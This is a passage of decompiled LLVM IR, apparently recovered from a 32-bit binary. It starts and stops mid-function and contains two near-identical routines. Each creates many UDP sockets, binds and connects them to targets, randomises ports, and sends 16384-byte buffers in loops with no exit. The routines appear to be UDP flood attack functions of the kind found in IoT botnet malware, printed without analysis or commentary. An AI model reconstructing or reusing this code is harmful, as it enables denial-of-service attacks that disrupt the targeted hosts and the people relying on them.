  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 44, { 3, 4, 5, 6, 1, 7, 0, 8, 2, 9 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_e4c4, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
  uselistorder label %dec_label_pc_e2fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e270, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e4d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e4d0:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_e4d0 = load i32, i32* @r4, align 4
  %v6_e4d0 = load i32, i32* @r5, align 4
  %v24_e4d0 = load i32, i32* @fp, align 4
  %v1_e4d4 = urem i32 %arg1, 256
  store i32 %v1_e4d4, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_e4ec = urem i32 %arg3, 256
  store i32 %v1_e4ec, i32* @r4, align 4
  %v2_e4f0 = call i32 @_calloc(i32 %v1_e4d4, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_e4f0, i32* @sl, align 4
  %v0_e4fc = load i32, i32* @r7, align 4
  %v2_e500 = call i32 @_calloc(i32 %v0_e4fc, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_e50c = load i32, i32* @r6, align 4
  store i32 %v0_e50c, i32* %r1.global-to-local, align 4
  store i32 %v2_e500, i32* @sb, align 4
  %v0_e51c = load i32, i32* @r4, align 4
  %v4_e520 = inttoptr i32 %v0_e50c to i32*
  %v5_e520 = call i32 @function_b240(i32 %v0_e51c, i32* %v4_e520, i32 7, i32 65535)
  %v3_e528 = urem i32 %v5_e520, 65536
  %v0_e52c = load i32, i32* @r6, align 4
  store i32 %v0_e52c, i32* %r1.global-to-local, align 4
  %v0_e534 = load i32, i32* @r5, align 4
  %v0_e538 = load i32, i32* @r4, align 4
  %v5_e540 = inttoptr i32 %v0_e52c to i32*
  %v6_e540 = call i32 @function_b240(i32 %v0_e538, i32* %v5_e540, i32 6, i32 %v0_e534)
  %v0_e544 = load i32, i32* @r6, align 4
  store i32 %v0_e544, i32* %r1.global-to-local, align 4
  %v3_e548 = mul i32 %v6_e540, 65536
  store i32 %v3_e548, i32* %fp.global-to-local, align 4
  %v0_e554 = load i32, i32* @r4, align 4
  %v4_e558 = inttoptr i32 %v0_e544 to i32*
  %v5_e558 = call i32 @function_b240(i32 %v0_e554, i32* %v4_e558, i32 0, i32 512)
  %v0_e564 = load i32, i32* @r6, align 4
  store i32 %v0_e564, i32* %r1.global-to-local, align 4
  %v0_e568 = load i32, i32* @r4, align 4
  %v3_e570 = urem i32 %v5_e558, 65536
  store i32 %v3_e570, i32* @r6, align 4
  %v4_e574 = inttoptr i32 %v0_e564 to i32*
  %v5_e574 = call i32 @function_b240(i32 %v0_e568, i32* %v4_e574, i32 1, i32 1)
  %v0_e578 = load i32, i32* %fp.global-to-local, align 4
  %v3_e578 = udiv i32 %v0_e578, 65536
  store i32 %v3_e578, i32* %r4.global-to-local, align 4
  %v1_e580 = load i32, i32* @r5, align 4
  %v9_e580 = icmp eq i32 %v3_e578, %v1_e580
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_e580, label %dec_label_pc_e5a8, label %bb

bb:                                               ; preds = %dec_label_pc_e4d0
  %v2_e594 = mul nuw nsw i32 %v3_e578, 256
  %v4_e598 = and i32 %v2_e594, 65280
  %v1_e59c = urem i32 %v5_e574, 256
  store i32 %v1_e59c, i32* @r8, align 4
  %v5_e5a0 = udiv i32 %v0_e578, 16777216
  %v6_e5a0 = or i32 %v4_e598, %v5_e5a0
  br label %dec_label_pc_e5b4

dec_label_pc_e5a8:                                ; preds = %dec_label_pc_e4d0
  %v1_e59c7 = urem i32 %v5_e574, 256
  store i32 %v1_e59c7, i32* @r8, align 4
  %v0_e5a8 = call i32 @function_117dc()
  %v3_e5b0 = urem i32 %v0_e5a8, 65536
  br label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %bb, %dec_label_pc_e5a8
  %storemerge17 = phi i32 [ %v6_e5a0, %bb ], [ %v3_e5b0, %dec_label_pc_e5a8 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_e5b4 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_e5b4, 1
  br i1 %tmp41, label %dec_label_pc_e760.preheader, label %dec_label_pc_e5bc

dec_label_pc_e760.preheader:                      ; preds = %dec_label_pc_e6bc, %dec_label_pc_e5b4
  %storemerge3.in12.ph = phi i32 [ %v0_e5b4, %dec_label_pc_e5b4 ], [ %v1_e610, %dec_label_pc_e6bc ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_e728, label %dec_label_pc_e72c.lr.ph

dec_label_pc_e5bc:                                ; preds = %dec_label_pc_e5b4
  store i32 %v3_e528, i32* %r1.global-to-local, align 4
  %v3_e5c0 = udiv i32 %v5_e520, 256
  %v5_e5cc = trunc i32 %v3_e5c0 to i8
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v3_e5e4 = udiv i32 %v5_e520, 65536
  %v4_e5f4 = trunc i32 %v3_e5e4 to i8
  store i8 %v4_e5f4, i8* %stack_var_-80, align 1
  %v3_e708 = icmp eq i32 %v3_e528, 65535
  %v2_e62c = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_e6ec

dec_label_pc_e5fc:                                ; preds = %dec_label_pc_e6ec
  %v2_e5fc = load i8, i8* %stack_var_-80, align 1
  %v3_e5fc = sext i8 %v2_e5fc to i32
  store i32 %v3_e5fc, i32* %r1.global-to-local, align 4
  %v2_e600 = load i32, i32* %r5.global-to-local, align 4
  %v3_e600 = add i32 %v2_e600, 2
  %v4_e600 = inttoptr i32 %v3_e600 to i8*
  store i8 %v5_e5cc, i8* %v4_e600, align 1
  %v0_e604 = load i32, i32* %r1.global-to-local, align 4
  %v1_e604 = trunc i32 %v0_e604 to i8
  %v2_e604 = load i32, i32* %r5.global-to-local, align 4
  %v3_e604 = add i32 %v2_e604, 3
  %v4_e604 = inttoptr i32 %v3_e604 to i8*
  store i8 %v1_e604, i8* %v4_e604, align 1
  br label %dec_label_pc_e608

dec_label_pc_e608:                                ; preds = %dec_label_pc_e714, %dec_label_pc_e5fc
  %v1_e610 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_e620 = call i32 @_socket(i32 2, i32 2, i32 17)
  %v7_e628 = icmp eq i32 %v3_e620, -1
  store i32 %v2_e62c, i32* %r1.global-to-local, align 4
  %v2_e638 = load i32, i32* @sb, align 4
  %v3_e638 = add i32 %v2_e638, %stack_var_-60.0
  %v4_e638 = inttoptr i32 %v3_e638 to i32*
  store i32 %v3_e620, i32* %v4_e638, align 4
  br i1 %v7_e628, label %dec_label_pc_e76c, label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %dec_label_pc_e608
  store i32 2, i32* %stack_var_-52, align 4
  %v3_e660 = call i32 @_bind(i32 %v3_e620, i32 %v2_e62c, i32 16)
  %v0_e664 = load i32, i32* %r5.global-to-local, align 4
  %v1_e664 = add i32 %v0_e664, 20
  %v2_e664 = inttoptr i32 %v1_e664 to i8*
  %v3_e664 = load i8, i8* %v2_e664, align 1
  %tmp = icmp ugt i8 %v3_e664, 31
  br i1 %tmp, label %dec_label_pc_e6bc, label %dec_label_pc_e670

dec_label_pc_e670:                                ; preds = %dec_label_pc_e640
  %v1_e670 = add i32 %v0_e664, 16
  %v2_e670 = inttoptr i32 %v1_e670 to i32*
  %v3_e670 = load i32, i32* %v2_e670, align 4
  store i32 %v3_e670, i32* %r4.global-to-local, align 4
  %v0_e674 = call i32 @function_117dc()
  %v1_e67c = and i32 %v3_e670, 65280
  %v3_e684 = mul i32 %v3_e670, 16777216
  %v4_e688 = mul nuw nsw i32 %v1_e67c, 256
  %v5_e688 = or i32 %v4_e688, %v3_e684
  store i32 %v5_e688, i32* %r1.global-to-local, align 4
  %v0_e690 = load i32, i32* %r5.global-to-local, align 4
  %v1_e690 = add i32 %v0_e690, 20
  %v2_e690 = inttoptr i32 %v1_e690 to i8*
  %v3_e690 = load i8, i8* %v2_e690, align 1
  %v4_e690 = zext i8 %v3_e690 to i32
  %v2_e694 = call i32 @llvm.bswap.i32(i32 %v3_e670)
  %v7_e698 = lshr i32 %v0_e674, %v4_e690
  %v8_e698 = add i32 %v7_e698, %v2_e694
  %v3_e6a4 = mul i32 %v8_e698, 16777216
  %v1_e6a8 = and i32 %v8_e698, 65280
  %v4_e6ac = mul nuw nsw i32 %v1_e6a8, 256
  %v5_e6ac = or i32 %v4_e6ac, %v3_e6a4
  store i32 %v5_e6ac, i32* %r1.global-to-local, align 4
  %v2_e6b4 = call i32 @llvm.bswap.i32(i32 %v8_e698)
  %v2_e6b8 = add i32 %v0_e690, 4
  %v3_e6b8 = inttoptr i32 %v2_e6b8 to i32*
  store i32 %v2_e6b4, i32* %v3_e6b8, align 4
  %v0_e6c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e6bc

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e640, %dec_label_pc_e670
  %v0_e6c8 = phi i32 [ %v0_e664, %dec_label_pc_e640 ], [ %v0_e6c8.pre, %dec_label_pc_e670 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_e6c4 = load i32, i32* @sb, align 4
  %v2_e6c4 = add i32 %v1_e6c4, %stack_var_-60.0
  %v3_e6c4 = inttoptr i32 %v2_e6c4 to i32*
  %v4_e6c4 = load i32, i32* %v3_e6c4, align 4
  store i32 %v0_e6c8, i32* %r1.global-to-local, align 4
  %v3_e6cc = call i32 @_connect(i32 %v4_e6c4, i32 %v0_e6c8, i32 16)
  %v1_e6d8 = add i32 %stack_var_-60.0, 4
  %v1_e6dc = load i32, i32* @r7, align 4
  %v9_e6dc = icmp eq i32 %v1_e610, %v1_e6dc
  %v0_e6e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_e6e4 = add i32 %v0_e6e4, 24
  store i32 %v1_e6e4, i32* %r5.global-to-local, align 4
  br i1 %v9_e6dc, label %dec_label_pc_e760.preheader, label %dec_label_pc_e6ec

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e6bc, %dec_label_pc_e5bc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_e5bc ], [ %v1_e6d8, %dec_label_pc_e6bc ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e5bc ], [ %v1_e610, %dec_label_pc_e6bc ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e6f8 = call i32 @_calloc(i32 65535, i32 1)
  store i32 %v3_e528, i32* %r1.global-to-local, align 4
  %v2_e70c = load i32, i32* @sl, align 4
  %v3_e70c = add i32 %v2_e70c, %stack_var_-60.0
  %v4_e70c = inttoptr i32 %v3_e70c to i32*
  store i32 %v2_e6f8, i32* %v4_e70c, align 4
  br i1 %v3_e708, label %dec_label_pc_e714, label %dec_label_pc_e5fc

dec_label_pc_e714:                                ; preds = %dec_label_pc_e6ec
  %v0_e714 = call i32 @function_117dc()
  %v1_e714 = trunc i32 %v0_e714 to i8
  %v4_e718 = sdiv i32 %v0_e714, 256
  %v1_e71c = trunc i32 %v4_e718 to i8
  %v2_e71c = load i32, i32* %r5.global-to-local, align 4
  %v3_e71c = add i32 %v2_e71c, 3
  %v4_e71c = inttoptr i32 %v3_e71c to i8*
  store i8 %v1_e71c, i8* %v4_e71c, align 1
  %v3_e720 = load i32, i32* %r5.global-to-local, align 4
  %v4_e720 = add i32 %v3_e720, 2
  %v5_e720 = inttoptr i32 %v4_e720 to i8*
  store i8 %v1_e714, i8* %v5_e720, align 1
  br label %dec_label_pc_e608

dec_label_pc_e728:                                ; preds = %dec_label_pc_e760.loopexit, %dec_label_pc_e760.preheader, %dec_label_pc_e764.loopexit, %dec_label_pc_e728
  br label %dec_label_pc_e728

dec_label_pc_e72c:                                ; preds = %dec_label_pc_e72c.lr.ph, %dec_label_pc_e764.loopexit
  %v0_e72c = load i32, i32* @r8, align 4
  %v2_e72c = icmp eq i32 %v0_e72c, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_e72c, label %dec_label_pc_e734, label %dec_label_pc_e774

dec_label_pc_e734:                                ; preds = %dec_label_pc_e72c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_e73c, %dec_label_pc_e734
  %v0_e744 = phi i32 [ %v1_e744, %dec_label_pc_e73c ], [ 0, %dec_label_pc_e734 ]
  %v0_e73c = phi i32 [ %v1_e758, %dec_label_pc_e73c ], [ 0, %dec_label_pc_e734 ]
  %v1_e73c = load i32, i32* @sb, align 4
  %v2_e73c = add i32 %v1_e73c, %v0_e73c
  %v3_e73c = inttoptr i32 %v2_e73c to i32*
  %v4_e73c = load i32, i32* %v3_e73c, align 4
  %v1_e740 = load i32, i32* @sl, align 4
  %v2_e740 = add i32 %v1_e740, %v0_e73c
  %v3_e740 = inttoptr i32 %v2_e740 to i32*
  %v4_e740 = load i32, i32* %v3_e740, align 4
  store i32 %v4_e740, i32* %r1.global-to-local, align 4
  %v1_e744 = add i32 %v0_e744, 1
  store i32 %v1_e744, i32* %r5.global-to-local, align 4
  %v0_e748 = load i32, i32* @r6, align 4
  %v4_e750 = call i32 @_send(i32 %v4_e73c, i32 %v4_e740, i32 %v0_e748, i32 16384)
  %v1_e754 = load i32, i32* @r7, align 4
  %v9_e754 = icmp eq i32 %v1_e744, %v1_e754
  %v0_e758 = load i32, i32* %r4.global-to-local, align 4
  %v1_e758 = add i32 %v0_e758, 4
  store i32 %v1_e758, i32* %r4.global-to-local, align 4
  br i1 %v9_e754, label %dec_label_pc_e760.loopexit, label %dec_label_pc_e73c

dec_label_pc_e760.loopexit:                       ; preds = %dec_label_pc_e73c
  %tmp4247 = icmp slt i32 %v1_e744, 1
  br i1 %tmp4247, label %dec_label_pc_e728, label %dec_label_pc_e72c.lr.ph

dec_label_pc_e72c.lr.ph:                          ; preds = %dec_label_pc_e760.preheader, %dec_label_pc_e760.loopexit
  br label %dec_label_pc_e72c

dec_label_pc_e764.loopexit:                       ; preds = %dec_label_pc_e77c
  %tmp42 = icmp slt i32 %v0_e7a4, 1
  br i1 %tmp42, label %dec_label_pc_e728, label %dec_label_pc_e72c

dec_label_pc_e76c:                                ; preds = %dec_label_pc_e608
  store i32 %v3_e4d0, i32* %r4.global-to-local, align 4
  store i32 %v6_e4d0, i32* %r5.global-to-local, align 4
  store i32 %v24_e4d0, i32* %fp.global-to-local, align 4
  ret i32 %v3_e620

dec_label_pc_e774:                                ; preds = %dec_label_pc_e72c
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c:                                ; preds = %dec_label_pc_e77c, %dec_label_pc_e774
  %v0_e77c = phi i32 [ %v1_e7a8, %dec_label_pc_e77c ], [ 0, %dec_label_pc_e774 ]
  %v1_e77c = load i32, i32* @sl, align 4
  %v2_e77c = add i32 %v1_e77c, %v0_e77c
  %v3_e77c = inttoptr i32 %v2_e77c to i32*
  %v4_e77c = load i32, i32* %v3_e77c, align 4
  store i32 %v4_e77c, i32* @r4, align 4
  %v0_e780 = load i32, i32* @r6, align 4
  store i32 %v0_e780, i32* @r1, align 4
  %v1_e788 = inttoptr i32 %v4_e77c to i8*
  %v2_e788 = call i32 @function_119b8(i8* %v1_e788)
  %v0_e78c = load i32, i32* @r5, align 4
  %v1_e78c = add i32 %v0_e78c, 1
  store i32 %v1_e78c, i32* @r5, align 4
  %v0_e790 = load i32, i32* @fp, align 4
  %v1_e790 = load i32, i32* @sb, align 4
  %v2_e790 = add i32 %v1_e790, %v0_e790
  %v3_e790 = inttoptr i32 %v2_e790 to i32*
  %v4_e790 = load i32, i32* %v3_e790, align 4
  %v0_e794 = load i32, i32* @r4, align 4
  store i32 %v0_e794, i32* %r1.global-to-local, align 4
  %v0_e798 = load i32, i32* @r6, align 4
  %v4_e7a0 = call i32 @_send(i32 %v4_e790, i32 %v0_e794, i32 %v0_e798, i32 16384)
  %v0_e7a4 = load i32, i32* @r5, align 4
  %v1_e7a4 = load i32, i32* @r7, align 4
  %v9_e7a4 = icmp eq i32 %v0_e7a4, %v1_e7a4
  %v0_e7a8 = load i32, i32* @fp, align 4
  %v1_e7a8 = add i32 %v0_e7a8, 4
  store i32 %v1_e7a8, i32* @fp, align 4
  br i1 %v9_e7a4, label %dec_label_pc_e764.loopexit, label %dec_label_pc_e77c

; uselistorder directives
  uselistorder i32 %v1_e7a8, { 1, 0 }
  uselistorder i32 %v0_e7a4, { 1, 0 }
  uselistorder i32 %v1_e758, { 1, 0 }
  uselistorder i32 %v1_e744, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v0_e6c8, { 1, 0 }
  uselistorder i32 %v8_e698, { 1, 2, 0 }
  uselistorder i32 %v3_e670, { 1, 2, 0, 3 }
  uselistorder i32 %v3_e620, { 1, 3, 2, 0 }
  uselistorder i32 %v1_e610, { 1, 2, 0 }
  uselistorder i32 %v3_e578, { 0, 2, 1 }
  uselistorder i32 %v3_e528, { 0, 2, 1 }
  uselistorder i32 %v1_e4d4, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_e72c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_e72c, { 1, 0 }
  uselistorder label %dec_label_pc_e728, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_e6bc, { 1, 0 }
  uselistorder label %dec_label_pc_e5b4, { 1, 0 }
}

define i32 @function_e7b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e7b8:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_e7b8 = load i32, i32* @r4, align 4
  %v6_e7b8 = load i32, i32* @r5, align 4
  %v24_e7b8 = load i32, i32* @fp, align 4
  %v1_e7bc = urem i32 %arg1, 256
  store i32 %v1_e7bc, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_e7d4 = urem i32 %arg3, 256
  store i32 %v1_e7d4, i32* @r4, align 4
  %v2_e7d8 = call i32 @_calloc(i32 %v1_e7bc, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_e7d8, i32* @sl, align 4
  %v0_e7e4 = load i32, i32* @r7, align 4
  %v2_e7e8 = call i32 @_calloc(i32 %v0_e7e4, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_e7f4 = load i32, i32* @r6, align 4
  store i32 %v0_e7f4, i32* %r1.global-to-local, align 4
  store i32 %v2_e7e8, i32* @sb, align 4
  %v0_e804 = load i32, i32* @r4, align 4
  %v4_e808 = inttoptr i32 %v0_e7f4 to i32*
  %v5_e808 = call i32 @function_b240(i32 %v0_e804, i32* %v4_e808, i32 7, i32 65535)
  %v3_e810 = urem i32 %v5_e808, 65536
  %v0_e814 = load i32, i32* @r6, align 4
  store i32 %v0_e814, i32* %r1.global-to-local, align 4
  %v0_e81c = load i32, i32* @r5, align 4
  %v0_e820 = load i32, i32* @r4, align 4
  %v5_e828 = inttoptr i32 %v0_e814 to i32*
  %v6_e828 = call i32 @function_b240(i32 %v0_e820, i32* %v5_e828, i32 6, i32 %v0_e81c)
  %v0_e82c = load i32, i32* @r6, align 4
  store i32 %v0_e82c, i32* %r1.global-to-local, align 4
  %v3_e830 = mul i32 %v6_e828, 65536
  store i32 %v3_e830, i32* %fp.global-to-local, align 4
  %v0_e83c = load i32, i32* @r4, align 4
  %v4_e840 = inttoptr i32 %v0_e82c to i32*
  %v5_e840 = call i32 @function_b240(i32 %v0_e83c, i32* %v4_e840, i32 0, i32 1024)
  %v0_e84c = load i32, i32* @r6, align 4
  store i32 %v0_e84c, i32* %r1.global-to-local, align 4
  %v0_e850 = load i32, i32* @r4, align 4
  %v3_e858 = urem i32 %v5_e840, 65536
  store i32 %v3_e858, i32* @r6, align 4
  %v4_e85c = inttoptr i32 %v0_e84c to i32*
  %v5_e85c = call i32 @function_b240(i32 %v0_e850, i32* %v4_e85c, i32 1, i32 1)
  %v0_e860 = load i32, i32* %fp.global-to-local, align 4
  %v3_e860 = udiv i32 %v0_e860, 65536
  store i32 %v3_e860, i32* %r4.global-to-local, align 4
  %v1_e868 = load i32, i32* @r5, align 4
  %v9_e868 = icmp eq i32 %v3_e860, %v1_e868
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_e868, label %dec_label_pc_e890, label %bb

bb:                                               ; preds = %dec_label_pc_e7b8
  %v2_e87c = mul nuw nsw i32 %v3_e860, 256
  %v4_e880 = and i32 %v2_e87c, 65280
  %v1_e884 = urem i32 %v5_e85c, 256
  store i32 %v1_e884, i32* @r8, align 4
  %v5_e888 = udiv i32 %v0_e860, 16777216
  %v6_e888 = or i32 %v4_e880, %v5_e888
  br label %dec_label_pc_e89c

dec_label_pc_e890:                                ; preds = %dec_label_pc_e7b8
  %v1_e8847 = urem i32 %v5_e85c, 256
  store i32 %v1_e8847, i32* @r8, align 4
  %v0_e890 = call i32 @function_117dc()
  %v3_e898 = urem i32 %v0_e890, 65536
  br label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %bb, %dec_label_pc_e890
  %storemerge17 = phi i32 [ %v6_e888, %bb ], [ %v3_e898, %dec_label_pc_e890 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_e89c = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_e89c, 1
  br i1 %tmp41, label %dec_label_pc_ea48.preheader, label %dec_label_pc_e8a4

dec_label_pc_ea48.preheader:                      ; preds = %dec_label_pc_e9a4, %dec_label_pc_e89c
  %storemerge3.in12.ph = phi i32 [ %v0_e89c, %dec_label_pc_e89c ], [ %v1_e8f8, %dec_label_pc_e9a4 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_ea10, label %dec_label_pc_ea14.lr.ph

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e89c
  store i32 %v3_e810, i32* %r1.global-to-local, align 4
  %v3_e8a8 = udiv i32 %v5_e808, 256
  %v5_e8b4 = trunc i32 %v3_e8a8 to i8
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v3_e8cc = udiv i32 %v5_e808, 65536
  %v4_e8dc = trunc i32 %v3_e8cc to i8
  store i8 %v4_e8dc, i8* %stack_var_-80, align 1
  %v3_e9f0 = icmp eq i32 %v3_e810, 65535
  %v2_e914 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_e9d4

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e9d4
  %v2_e8e4 = load i8, i8* %stack_var_-80, align 1
  %v3_e8e4 = sext i8 %v2_e8e4 to i32
  store i32 %v3_e8e4, i32* %r1.global-to-local, align 4
  %v2_e8e8 = load i32, i32* %r5.global-to-local, align 4
  %v3_e8e8 = add i32 %v2_e8e8, 2
  %v4_e8e8 = inttoptr i32 %v3_e8e8 to i8*
  store i8 %v5_e8b4, i8* %v4_e8e8, align 1
  %v0_e8ec = load i32, i32* %r1.global-to-local, align 4
  %v1_e8ec = trunc i32 %v0_e8ec to i8
  %v2_e8ec = load i32, i32* %r5.global-to-local, align 4
  %v3_e8ec = add i32 %v2_e8ec, 3
  %v4_e8ec = inttoptr i32 %v3_e8ec to i8*
  store i8 %v1_e8ec, i8* %v4_e8ec, align 1
  br label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e9fc, %dec_label_pc_e8e4
  %v1_e8f8 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_e908 = call i32 @_socket(i32 2, i32 2, i32 0)
  %v7_e910 = icmp eq i32 %v3_e908, -1
  store i32 %v2_e914, i32* %r1.global-to-local, align 4
  %v2_e920 = load i32, i32* @sb, align 4
  %v3_e920 = add i32 %v2_e920, %stack_var_-60.0
  %v4_e920 = inttoptr i32 %v3_e920 to i32*
  store i32 %v3_e908, i32* %v4_e920, align 4
  br i1 %v7_e910, label %dec_label_pc_ea54, label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e8f0
  store i32 2, i32* %stack_var_-52, align 4
  %v3_e948 = call i32 @_bind(i32 %v3_e908, i32 %v2_e914, i32 16)
  %v0_e94c = load i32, i32* %r5.global-to-local, align 4
  %v1_e94c = add i32 %v0_e94c, 20
  %v2_e94c = inttoptr i32 %v1_e94c to i8*
  %v3_e94c = load i8, i8* %v2_e94c, align 1
  %tmp = icmp ugt i8 %v3_e94c, 31
  br i1 %tmp, label %dec_label_pc_e9a4, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e928
  %v1_e958 = add i32 %v0_e94c, 16
  %v2_e958 = inttoptr i32 %v1_e958 to i32*
  %v3_e958 = load i32, i32* %v2_e958, align 4
  store i32 %v3_e958, i32* %r4.global-to-local, align 4
  %v0_e95c = call i32 @function_117dc()
  %v1_e964 = and i32 %v3_e958, 65280
  %v3_e96c = mul i32 %v3_e958, 16777216
  %v4_e970 = mul nuw nsw i32 %v1_e964, 256
  %v5_e970 = or i32 %v4_e970, %v3_e96c
  store i32 %v5_e970, i32* %r1.global-to-local, align 4
  %v0_e978 = load i32, i32* %r5.global-to-local, align 4
  %v1_e978 = add i32 %v0_e978, 20
  %v2_e978 = inttoptr i32 %v1_e978 to i8*
  %v3_e978 = load i8, i8* %v2_e978, align 1
  %v4_e978 = zext i8 %v3_e978 to i32
  %v2_e97c = call i32 @llvm.bswap.i32(i32 %v3_e958)
  %v7_e980 = lshr i32 %v0_e95c, %v4_e978
  %v8_e980 = add i32 %v7_e980, %v2_e97c
  %v3_e98c = mul i32 %v8_e980, 16777216
  %v1_e990 = and i32 %v8_e980, 65280
  %v4_e994 = mul nuw nsw i32 %v1_e990, 256
  %v5_e994 = or i32 %v4_e994, %v3_e98c
  store i32 %v5_e994, i32* %r1.global-to-local, align 4
  %v2_e99c = call i32 @llvm.bswap.i32(i32 %v8_e980)
  %v2_e9a0 = add i32 %v0_e978, 4
  %v3_e9a0 = inttoptr i32 %v2_e9a0 to i32*
  store i32 %v2_e99c, i32* %v3_e9a0, align 4
  %v0_e9b0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e9a4

dec_label_pc_e9a4:                                ; preds = %dec_label_pc_e928, %dec_label_pc_e958
  %v0_e9b0 = phi i32 [ %v0_e94c, %dec_label_pc_e928 ], [ %v0_e9b0.pre, %dec_label_pc_e958 ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_e9ac = load i32, i32* @sb, align 4
  %v2_e9ac = add i32 %v1_e9ac, %stack_var_-60.0
  %v3_e9ac = inttoptr i32 %v2_e9ac to i32*
  %v4_e9ac = load i32, i32* %v3_e9ac, align 4
  store i32 %v0_e9b0, i32* %r1.global-to-local, align 4
  %v3_e9b4 = call i32 @_connect(i32 %v4_e9ac, i32 %v0_e9b0, i32 16)
  %v1_e9c0 = add i32 %stack_var_-60.0, 4
  %v1_e9c4 = load i32, i32* @r7, align 4
  %v9_e9c4 = icmp eq i32 %v1_e8f8, %v1_e9c4
